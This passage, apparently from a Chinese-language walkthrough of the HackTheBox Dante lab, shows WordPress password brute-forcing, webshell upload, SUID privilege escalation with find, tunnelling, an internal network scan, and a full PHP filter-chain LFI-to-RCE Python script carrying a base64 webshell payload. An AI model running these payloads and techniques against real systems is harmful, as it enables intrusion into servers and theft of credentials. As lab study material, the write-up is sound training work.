http://10.10.110.100:65000/wordpress --usernames james -P password.txt </span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.22</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]</span><br><span class="line">[+] Started: Mon May 15 02:14:19 2023</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Reference: https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwenty</span><br><span class="line"> | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.2</span><br><span class="line"> | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Twenty</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwenty/</span><br><span class="line"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:05 &lt;=================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:05</span><br><span class="line"></span><br><span class="line">[i] Config Backup(s) Identified:</span><br><span class="line"></span><br><span class="line">[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">[SUCCESS] - james / Toyota                                                                                                                                                                                                      </span><br><span class="line">Trying james / Motor Time: 00:00:32 &lt;==================================================================                                                                                      &gt; (400 / 893) 44.79%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: james, Password: Toyota</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon May 15 02:15:12 2023</span><br><span class="line">[+] Requests Done: 540</span><br><span class="line">[+] Cached Requests: 41</span><br><span class="line">[+] Data Sent: 187.165 KB</span><br><span class="line">[+] Data Received: 2.269 MB</span><br><span class="line">[+] Memory used: 262.699 MB</span><br><span class="line">[+] Elapsed time: 00:00:52</span><br></pre></td></tr></table></figure><p>得到一对帐号密码：<code>james:Toyota</code> ，并且发现<a href="http://10.10.110.100:65000/wordpress/.wp-config.php.swp">http://10.10.110.100:65000/wordpress/.wp-config.php.swp</a> 。尝试用该帐号和密码登录后台，发现还是管理员权限：</p><p><a href="https://pic.imgdb.cn/item/6461cfba0d2dde5777b6f4ce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461cfba0d2dde5777b6f4ce.jpg"></a></p><p>之后在上传主题那里，上传一个webshell，可以在&#x2F;wordpress&#x2F;wp-content&#x2F;uploads看到：</p><p><a href="https://pic.imgdb.cn/item/6461d0230d2dde5777b76827.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461d0230d2dde5777b76827.jpg"></a></p><p>之后蚁剑连接拿到shell。在home目录下发现还存在一个叫james的用户：</p><p><a href="https://pic.imgdb.cn/item/6461d1b60d2dde5777b96160.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461d1b60d2dde5777b96160.jpg"></a></p><p>继续用之前的密码登录一下拿到flag：</p><p><a href="https://pic.imgdb.cn/item/6462b0350d2dde577711a337.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0350d2dde577711a337.jpg"></a></p><h3 id="Show-me-the-way"><a href="#Show-me-the-way" class="headerlink" title="Show me the way"></a>Show me the way</h3><p>发现在james用户目录下存在.bash_histroy，以下是内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">james@DANTE-WEB-NIX01:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">cd /home/balthazar</span><br><span class="line">rm .mysql_history</span><br><span class="line">mysql -u balthazar -p TheJoker12345!</span><br></pre></td></tr></table></figure><p>之后尝试SUID提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6461d2b20d2dde5777bafa82.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461d2b20d2dde5777bafa82.jpg"></a></p><p>find命令可以用如下方式提权：</p><p><a href="https://pic.imgdb.cn/item/6462b0540d2dde577711b667.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0540d2dde577711b667.jpg"></a></p><p><code>find . -exec /bin/sh -p \; -quit</code>进入sh，之后给&#x2F;bin&#x2F;bash设置SUID位，再&#x2F;bin&#x2F;bash -p即可。至此拿到DANTE-WEB-NIX01的root，别忘了添加路由。</p><h3 id="Seclusion-is-an-illusion"><a href="#Seclusion-is-an-illusion" class="headerlink" title="Seclusion is an illusion"></a>Seclusion is an illusion</h3><p>接下来用chisel搭一条代理隧道：</p><p><a href="https://pic.imgdb.cn/item/6461e28d0d2dde5777d29efd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e28d0d2dde5777d29efd.jpg"></a></p><p>用fscan走这条代理扫一下内网：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080</span><br><span class="line">​</span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">Socks5Proxy: socks5://127.0.0.1:1080</span><br><span class="line">start infoscan</span><br><span class="line">172.16.1.101:21 open</span><br><span class="line">172.16.1.10:80 open</span><br><span class="line">172.16.1.20:22 open</span><br><span class="line">172.16.1.5:21 open</span><br><span class="line">172.16.1.1:80 open</span><br><span class="line">172.16.1.12:22 open</span><br><span class="line">172.16.1.20:80 open</span><br><span class="line">172.16.1.13:80 open</span><br><span class="line">172.16.1.10:22 open</span><br><span class="line">172.16.1.100:21 open</span><br><span class="line">172.16.1.12:80 open</span><br><span class="line">172.16.1.100:22 open</span><br><span class="line">172.16.1.12:21 open</span><br><span class="line">172.16.1.19:80 open</span><br><span class="line">172.16.1.17:80 open</span><br><span class="line">172.16.1.100:80 open</span><br><span class="line">172.16.1.102:80 open</span><br><span class="line">172.16.1.5:135 open</span><br><span class="line">172.16.1.20:135 open</span><br><span class="line">172.16.1.101:135 open</span><br><span class="line">172.16.1.102:135 open</span><br><span class="line">172.16.1.5:139 open</span><br><span class="line">172.16.1.17:139 open</span><br><span class="line">172.16.1.10:139 open</span><br><span class="line">172.16.1.20:139 open</span><br><span class="line">172.16.1.102:139 open</span><br><span class="line">172.16.1.101:139 open</span><br><span class="line">172.16.1.12:443 open</span><br><span class="line">172.16.1.20:443 open</span><br><span class="line">172.16.1.1:443 open</span><br><span class="line">172.16.1.13:443 open</span><br><span class="line">172.16.1.102:443 open</span><br><span class="line">172.16.1.5:445 open</span><br><span class="line">172.16.1.10:445 open</span><br><span class="line">172.16.1.20:445 open</span><br><span class="line">172.16.1.17:445 open</span><br><span class="line">172.16.1.13:445 open</span><br><span class="line">172.16.1.101:445 open</span><br><span class="line">172.16.1.102:445 open</span><br><span class="line">172.16.1.5:1433 open</span><br><span class="line">172.16.1.12:3306 open</span><br><span class="line">172.16.1.102:3306 open</span><br><span class="line">172.16.1.19:8080 open</span><br><span class="line">172.16.1.20:88 open</span><br><span class="line">172.16.1.17:10000 open</span><br><span class="line">[*] alive ports len is: 45</span><br><span class="line">start vulscan</span><br><span class="line">已完成 0/45 [-] Ms17010 172.16.1.13 EOF</span><br><span class="line">[*] WebTitle: http://172.16.1.1         code:301 len:178    title:301 Moved Permanently 跳转url: https://172.16.1.1/</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.101</span><br><span class="line">   [-&gt;]DANTE-WS02</span><br><span class="line">   [-&gt;]172.16.1.101</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.102</span><br><span class="line">   [-&gt;]DANTE-WS03</span><br><span class="line">   [-&gt;]172.16.1.102</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.5</span><br><span class="line">   [-&gt;]DANTE-SQL01</span><br><span class="line">   [-&gt;]172.16.1.5</span><br><span class="line">[*] WebTitle: http://172.16.1.12        code:302 len:0      title:None 跳转url: http://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.19        code:200 len:553    title:Index of /</span><br><span class="line">[*] WebTitle: http://172.16.1.100       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle: http://172.16.1.13        code:302 len:0      title:None 跳转url: http://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.17        code:200 len:963    title:Index of /</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.20</span><br><span class="line">   [-&gt;]DANTE-DC01</span><br><span class="line">   [-&gt;]172.16.1.20</span><br><span class="line">[*] WebTitle: http://172.16.1.10        code:200 len:28842  title:Dante Hosting</span><br><span class="line">[*] WebTitle: https://172.16.1.12       code:302 len:0      title:None 跳转url: https://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.102       code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.102      code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.13       code:302 len:0      title:None 跳转url: https://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.20        code:200 len:3173   title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.1        code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.20       code:200 len:3173   title:None</span><br><span class="line">[+] 172.16.1.20 MS17-010        (Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[*] WebTitle: http://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.19:8080   code:403 len:793    title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: https://172.16.1.1/       code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[+] http://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">[+] https://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">已完成 45/45</span><br><span class="line">[*] 扫描结束,耗时: 8m5.925407215s</span><br></pre></td></tr></table></figure><p>接下来我们看172.16.1.10，刚刚fscan扫到了22,80,139,445这些端口，先进一下web界面吧：</p><p><a href="https://pic.imgdb.cn/item/6461e36f0d2dde5777d3ae2f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e36f0d2dde5777d3ae2f.jpg"></a></p><p>随便点旁边一个按钮，注意看上面的链接 ：</p><p><a href="https://pic.imgdb.cn/item/6461e3350d2dde5777d35f82.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e3350d2dde5777d35f82.jpg"></a></p><p>猜测存在LFI，尝试读一下&#x2F;etc&#x2F;passwd：</p><p><a href="https://pic.imgdb.cn/item/6461e3b20d2dde5777d3f5de.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e3b20d2dde5777d3f5de.jpg"></a></p><p>可以读到，并且我们可以看到有一个名为margaret的用户，只是它的shell不是bash而是lshell。因为这个站用的是php，并且存在LFI，所以我们可以构造php filter chain来RCE，关于构造php filter chain来RCE的方法我这里就不过多介绍了，打CTF的师傅们应该接触过，想要了解的可以看看Zedd师傅写的一篇文章：<a href="https://tttang.com/archive/1395/">hxp CTF 2021 – The End Of LFI?</a>。这篇文章从最简单的LFI开始，一步步构造php filter chain从而实现RCE，师傅们看了之后一定会很有收获的。 我这里直接贴脚本吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://172.16.1.10/nav.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"> </span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"> </span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: final_payload</span><br><span class="line">&#125;,proxies=proxies)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>脚本执行结果如下所示：</p><p><a href="https://pic.imgdb.cn/item/6461e5ff0d2dde5777d6dd21.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e5ff0d2dde5777d6dd21.jpg"></a></p><p>接下来就反弹个shell，直接改脚本里的命令即可：</p><p><a href="https://pic.imgdb.cn/item/6461e6ba0d2dde5777d7e926.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e6ba0d2dde5777d7e926.jpg"></a></p><p>之后我们读取&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress目录下的wp-config.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 